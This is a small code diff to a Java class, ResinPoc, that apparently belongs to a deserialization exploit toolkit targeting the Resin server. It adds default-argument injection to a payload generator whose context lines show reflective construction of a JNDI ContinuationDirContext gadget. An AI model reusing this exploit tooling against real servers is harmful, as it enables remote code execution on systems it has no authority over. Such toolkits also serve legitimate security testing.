@@ -25,6 +25,8 @@ import javax.naming.directory.DirContext;
  */
 public class ResinPoc implements Payload {
 
+  private String[] args;
+
   /**
    *
    * @param args
@@ -36,6 +38,8 @@ public class ResinPoc implements Payload {
    */
   @Override
   public Object getPayload(String[] args) {
+    if (this.args != null)
+      args = this.args;
     try {
       Class<?> ccCl = Class.forName("javax.naming.spi.ContinuationDirContext"); //$NON-NLS-1$
       Constructor<?> ccCons = ccCl
@@ -58,4 +62,10 @@ public class ResinPoc implements Payload {
     }
     return null;
   }
+
+  @Override
+  public void injectDefaultArgs(String[] args) {
+    this.args = args;
+  }
+
 }
